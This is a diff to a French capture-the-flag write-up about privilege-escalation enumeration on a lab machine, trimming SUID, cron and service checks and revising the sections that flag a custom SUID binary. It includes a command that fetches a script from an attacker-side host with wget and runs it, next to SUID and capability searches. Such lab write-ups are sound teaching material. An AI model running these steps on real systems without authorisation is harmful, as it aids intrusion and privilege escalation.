@@ -905,27 +905,6 @@ laboratory
 
 
 
-### Recherche de binaires SUID
-
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
-
-```
-find / -perm -4000 -type f 2>/dev/null
-```
-
-La liste obtenue ne contient que des binaires système classiques tels que :
-
-```
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
-...
-```
-
-Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
-
 ### Analyse des Linux capabilities
 
 Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
@@ -939,14 +918,17 @@ getcap -r / 2>/dev/null
 Résultat :
 
 ```
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
-/usr/bin/ping cap_net_raw=ep
-/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
+Les capabilities relevées concernent principalement des outils réseau classiques comme `ping`, `traceroute6.iputils` et `mtr-packet`.
 
-### Analyse complémentaire avec suid3num.py
+Cette vérification ne donne donc pas d’élément exploitable dans ce contexte.
+
+### Analyse des SUID avec suid3num.py
 
 Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
 
@@ -961,61 +943,18 @@ wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
 
-L’analyse confirme principalement la présence de binaires système classiques :
+Dans sa sortie, la section intéressante est la suivante :
 
-```
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/su
-/usr/bin/mount
-/usr/bin/umount
-...
+```text
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+/usr/local/bin/docker-security
+------------------------------
 ```
 
-L’outil confirme que :
+Cette information confirme que `/usr/local/bin/docker-security` n’est pas un binaire SUID standard du système, mais un programme personnalisé présent sur la machine. C’est donc lui qui mérite une analyse plus approfondie pour l’escalade de privilèges.
 
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
 
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
-
-### Inspection des tâches cron
-
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
-
-```
-cat /etc/crontab
-```
-
-Résultat :
-
-```
-17 * * * * root cd / && run-parts --report /etc/cron.hourly
-25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
-47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
-52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
-```
-
-Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.
-
-### Analyse des services locaux
-
-Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
-
-```
-netstat -tulpn
-```
-
-Résultat :
-
-### Conclusion de l’énumération manuelle
-
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
 
 ---
 
